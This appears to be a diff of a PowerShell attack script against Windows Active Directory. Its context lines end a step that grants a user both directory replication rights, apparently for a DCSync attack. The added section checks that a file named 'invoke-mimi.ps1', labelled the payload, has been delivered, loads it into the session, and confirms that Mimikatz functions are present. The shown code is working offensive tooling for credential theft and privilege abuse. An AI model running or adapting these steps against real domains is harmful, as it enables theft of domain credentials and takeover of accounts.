@@ -34,3 +34,42 @@ foreach ($right in $rights) {
 Set-Acl -Path $aclPath -AclObject $acl
 
 Write-Host "Granted both replication rights to $targetUser"
+
+
+## 2
+$ErrorActionPreference = "Stop"
+
+Write-Output "Computer: $env:COMPUTERNAME"
+Write-Output "Identity: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)"
+
+$payload = ".\invoke-mimi.ps1"
+
+if (-not (Test-Path -LiteralPath $payload)) {
+    Write-Error "Payload was not delivered: $payload"
+    exit 10
+}
+
+Write-Output "Payload size:"
+Get-Item -LiteralPath $payload |
+    Select-Object Name, Length, LastWriteTime
+
+Write-Output "Loading payload."
+
+. $payload
+
+Write-Output "Matching commands:"
+
+$commands = Get-Command `
+    -Name "*Mimi*" `
+    -CommandType Function,Cmdlet `
+    -ErrorAction SilentlyContinue
+
+$commands |
+    Select-Object Name, CommandType, Source
+
+if (-not $commands) {
+    Write-Error "The payload loaded, but no Mimikatz-related function was found."
+    exit 20
+}
+
+Write-Output "Payload validation completed."
